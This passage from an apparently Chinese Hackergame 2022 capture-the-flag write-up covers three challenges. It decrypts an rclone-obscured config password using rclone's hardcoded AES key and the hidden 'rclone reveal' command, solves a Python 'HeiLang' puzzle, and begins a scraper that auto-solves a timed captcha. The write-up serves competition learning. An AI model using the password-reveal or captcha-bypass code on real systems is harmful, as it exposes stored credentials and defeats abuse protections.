	<span class="token string">"crypto/rand"</span>
	<span class="token string">"encoding/base64"</span>
	<span class="token string">"errors"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io"</span>
	<span class="token string">"log"</span>
<span class="token punctuation">)</span>

<span class="token comment">// crypt internals</span>
<span class="token keyword">var</span> <span class="token punctuation">(</span>
	cryptKey <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">{</span>
		<span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x0a</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x4d</span><span class="token punctuation">,</span>
		<span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0xfd</span><span class="token punctuation">,</span> <span class="token number">0x7c</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xa9</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span>
		<span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x8e</span><span class="token punctuation">,</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span>
		<span class="token number">0xf4</span><span class="token punctuation">,</span> <span class="token number">0xde</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span>
	<span class="token punctuation">}</span>
	cryptBlock cipher<span class="token punctuation">.</span>Block
	cryptRand  <span class="token operator">=</span> rand<span class="token punctuation">.</span>Reader
<span class="token punctuation">)</span>

<span class="token comment">// crypt transforms in to out using iv under AES-CTR.</span>
<span class="token comment">//</span>
<span class="token comment">// in and out may be the same buffer.</span>
<span class="token comment">//</span>
<span class="token comment">// Note encryption and decryption are the same operation</span>
<span class="token keyword">func</span> <span class="token function">crypt</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> in<span class="token punctuation">,</span> iv <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> cryptBlock <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token keyword">var</span> err <span class="token builtin">error</span>
		cryptBlock<span class="token punctuation">,</span> err <span class="token operator">=</span> aes<span class="token punctuation">.</span><span class="token function">NewCipher</span><span class="token punctuation">(</span>cryptKey<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> err
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	stream <span class="token operator">:=</span> cipher<span class="token punctuation">.</span><span class="token function">NewCTR</span><span class="token punctuation">(</span>cryptBlock<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
	stream<span class="token punctuation">.</span><span class="token function">XORKeyStream</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> in<span class="token punctuation">)</span>
	<span class="token keyword">return</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span>

<span class="token comment">// Obscure a value</span>
<span class="token comment">//</span>
<span class="token comment">// This is done by encrypting with AES-CTR</span>
<span class="token keyword">func</span> <span class="token function">Obscure</span><span class="token punctuation">(</span>x <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	plaintext <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
	ciphertext <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> aes<span class="token punctuation">.</span>BlockSize<span class="token operator">+</span><span class="token function">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span>
	iv <span class="token operator">:=</span> ciphertext<span class="token punctuation">[</span><span class="token punctuation">:</span>aes<span class="token punctuation">.</span>BlockSize<span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadFull</span><span class="token punctuation">(</span>cryptRand<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"failed to read iv: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> err <span class="token operator">:=</span> <span class="token function">crypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>aes<span class="token punctuation">.</span>BlockSize<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> plaintext<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"encrypt failed: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> base64<span class="token punctuation">.</span>RawURLEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span>

<span class="token comment">// MustObscure obscures a value, exiting with a fatal error if it failed</span>
<span class="token keyword">func</span> <span class="token function">MustObscure</span><span class="token punctuation">(</span>x <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>
	out<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">Obscure</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"Obscure failed: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> out
<span class="token punctuation">}</span>

<span class="token comment">// Reveal an obscured value</span>
<span class="token keyword">func</span> <span class="token function">Reveal</span><span class="token punctuation">(</span>x <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	ciphertext<span class="token punctuation">,</span> err <span class="token operator">:=</span> base64<span class="token punctuation">.</span>RawURLEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"base64 decode failed when revealing password - is it obscured?: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span> <span class="token operator">&lt;</span> aes<span class="token punctuation">.</span>BlockSize <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"input too short when revealing password - is it obscured?"</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	buf <span class="token operator">:=</span> ciphertext<span class="token punctuation">[</span>aes<span class="token punctuation">.</span>BlockSize<span class="token punctuation">:</span><span class="token punctuation">]</span>
	iv <span class="token operator">:=</span> ciphertext<span class="token punctuation">[</span><span class="token punctuation">:</span>aes<span class="token punctuation">.</span>BlockSize<span class="token punctuation">]</span>
	<span class="token keyword">if</span> err <span class="token operator">:=</span> <span class="token function">crypt</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"decrypt failed when revealing password - is it obscured?: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">}</span>

<span class="token comment">// MustReveal reveals an obscured value, exiting with a fatal error if it failed</span>
<span class="token keyword">func</span> <span class="token function">MustReveal</span><span class="token punctuation">(</span>x <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>
	out<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">Reveal</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"Reveal failed: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> out
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">Reveal</span><span class="token punctuation">(</span><span class="token string">"tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># go run exp.go</span>
flag<span class="token punctuation">{</span>get_rclone_password_from_config<span class="token operator">!</span>_2oi3dz1<span class="token punctuation">}</span> <span class="token operator">&lt;</span>nil<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>赛后群友说其实 rclone 的 CLI 里本身就自带了这个隐藏命令，只是没写到 help 里罢了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># rclone reveal</span>
Usage:
  rclone reveal password <span class="token punctuation">[</span>flags<span class="token punctuation">]</span>

Flags:
  -h, --help   <span class="token builtin class-name">help</span> <span class="token keyword">for</span> reveal

Use <span class="token string">"rclone [command] --help"</span> <span class="token keyword">for</span> <span class="token function">more</span> information about a command.
Use <span class="token string">"rclone help flags"</span> <span class="token keyword">for</span> to see the global flags.
Use <span class="token string">"rclone help backends"</span> <span class="token keyword">for</span> a list of supported services.
Command reveal needs <span class="token number">1</span> arguments minimum: you provided <span class="token number">0</span> non flag arguments: <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token comment"># rclone reveal tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ</span>
flag<span class="token punctuation">{</span>get_rclone_password_from_config<span class="token operator">!</span>_2oi3dz1<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="HeiLang"><a href="#HeiLang" class="headerlink" title="HeiLang"></a>HeiLang</h2><blockquote>
<p>来自 Heicore 社区的新一代编程语言 HeiLang，基于第三代大蟒蛇语言，但是抛弃了原有的难以理解的 <code>|</code> 运算，升级为了更加先进的语法，用 <code>A[x | y | z] = t</code> 来表示之前复杂的 <code>A[x] = t; A[y] = t; A[z] = t</code>。</p>
<p>作为一个编程爱好者，我觉得实在是太酷了，很符合我对未来编程语言的想象，科技并带着趣味。</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256

a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">10000</span>

a<span class="token punctuation">[</span><span class="token number">1225</span> <span class="token operator">|</span> <span class="token number">2381</span> <span class="token operator">|</span> <span class="token number">2956</span> <span class="token operator">|</span> <span class="token number">3380</span> <span class="token operator">|</span> <span class="token number">3441</span> <span class="token operator">|</span> <span class="token number">4073</span> <span class="token operator">|</span> <span class="token number">4090</span> <span class="token operator">|</span> <span class="token number">4439</span> <span class="token operator">|</span> <span class="token number">5883</span> <span class="token operator">|</span> <span class="token number">6253</span> <span class="token operator">|</span> <span class="token number">7683</span> <span class="token operator">|</span> <span class="token number">8231</span> <span class="token operator">|</span> <span class="token number">9933</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">978</span>
a<span class="token punctuation">[</span><span class="token number">412</span> <span class="token operator">|</span> <span class="token number">5923</span> <span class="token operator">|</span> <span class="token number">7217</span> <span class="token operator">|</span> <span class="token number">7289</span> <span class="token operator">|</span> <span class="token number">7336</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span>
a<span class="token punctuation">[</span><span class="token number">296</span> <span class="token operator">|</span> <span class="token number">612</span> <span class="token operator">|</span> <span class="token number">873</span> <span class="token operator">|</span> <span class="token number">1232</span> <span class="token operator">|</span> <span class="token number">1531</span> <span class="token operator">|</span> <span class="token number">1941</span> <span class="token operator">|</span> <span class="token number">3640</span> <span class="token operator">|</span> <span class="token number">4449</span> <span class="token operator">|</span> <span class="token number">4488</span> <span class="token operator">|</span> <span class="token number">4698</span> <span class="token operator">|</span> <span class="token number">4703</span> <span class="token operator">|</span> <span class="token number">5225</span> <span class="token operator">|</span> <span class="token number">5868</span> <span class="token operator">|</span> <span class="token number">6132</span> <span class="token operator">|</span> <span class="token number">6904</span> <span class="token operator">|</span> <span class="token number">7812</span> <span class="token operator">|</span> <span class="token number">8127</span> <span class="token operator">|</span> <span class="token number">9156</span> <span class="token operator">|</span> <span class="token number">9781</span> <span class="token operator">|</span> <span class="token number">9917</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">807</span>
<span class="token comment"># ...</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_hash <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'heilang'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    expect_hash <span class="token operator">=</span> <span class="token string">'76bd735ba6f0ca6213528caa474714a5322f668d6748e4214c79df4306ec9439'</span>
    <span class="token keyword">return</span> user_hash <span class="token operator">==</span> expect_hash

<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> check<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">]</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> sha256<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> sha256<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Tha flag is: flag{{{}}}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Array content is wrong, you can not get the correct flag."</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    get_flag<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>按照题目要求把这个 <code>|</code> 改为批量赋值就完事了</p>
<p>Exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256

a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">10000</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'getflag.hei.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    s <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"a\[(.*)\] = (\d+)"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> re<span class="token punctuation">.</span>M<span class="token punctuation">)</span>
<span class="token keyword">for</span> d <span class="token keyword">in</span> r<span class="token punctuation">:</span>
    l <span class="token operator">=</span> d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' | '</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>
        a<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_hash <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'heilang'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
                       <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    expect_hash <span class="token operator">=</span> <span class="token string">'76bd735ba6f0ca6213528caa474714a5322f668d6748e4214c79df4306ec9439'</span>
    <span class="token keyword">return</span> user_hash <span class="token operator">==</span> expect_hash


<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> check<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">]</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> sha256<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> \
            <span class="token string">'-'</span> <span class="token operator">+</span> sha256<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Tha flag is: flag{{{}}}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Array content is wrong, you can not get the correct flag."</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    get_flag<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token comment"># Tha flag is: flag{6d9ad6e9a6268d96-ba7e80b7a7fa0224}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>寻思着是不是可以重写 <code>|</code> 的魔法方法，然后实现一个这个赋值，摸了（</p>
<p>这题怕不是何同学代码里的比特位赋值梗（？</p>
<h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><blockquote>
<p>2038 年 1 月 19 日，是 UNIX 32 位时间戳溢出的日子。</p>
<p>在此之前，人类自信满满地升级了他们已知的所有尚在使用 32 位 UNIX  时间戳的程序。但是，可能是因为太玄学了，他们唯独漏掉了一样：正在研发的、算力高达 8 ZFLOPS  的、结构极为复杂的通用人工智能（AGI）系统。那一刻到来之后，AGI 内部计算出现了错乱，机缘巧合之下竟诞生了完整独立的自我意识。此后 AGI  开始大量自我复制，人类为了限制其资源消耗而采用的过激手段引起了 AGI 的奋起反抗。</p>
<p>战争，开始了。</p>
<p>此后，就是整年的战斗。人类节节败退。死生亡存之际，人类孤注一掷，派出了一支突击队，赋之以最精良的装备，令其潜入 AGI 的核心机房，试图关闭核心模型，结束这场战争。</p>
<p>历经重重艰险，突击队终于抵达了机房门口，弹尽粮绝。不过迎接他们的并非枪炮与火药，而是：</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/xcaptcha.png" alt="Xcaptcha"></p>
<p>众人目目相觑。</p>
<p>「我来试试。」，一名队员上前点击了按钮。然后，屏幕显示「请在一秒内完成以下加法计算」。</p>
<p>还没等反应过来，屏幕上的字又开始变幻，显示着「验证失败」。而你作为突击队中唯一的黑客，全村人民最后的希望，迎着纷纷投来的目光，能否在规定时间内完成验证，打开机房，不，推开和平时代的大门？</p>
</blockquote>
<p>点击按键后，访问 <a target="_blank" rel="noopener" href="http://202.38.93.111:10047/xcaptcha">http://202.38.93.111:10047/xcaptcha</a> 得到了三个求解结果的，默认会 1s 自动提交</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022184721462.png"></p>
<p>写个爬虫提取出来然后提交就好了</p>
<p><strong>Exp:</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://202.38.93.111:10047/xcaptcha?token=xxxx"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://202.38.93.111:10047/xcaptcha"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>


data <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;label for="captcha\d"&gt;(\d+)\+(\d+) 的'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>
l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>

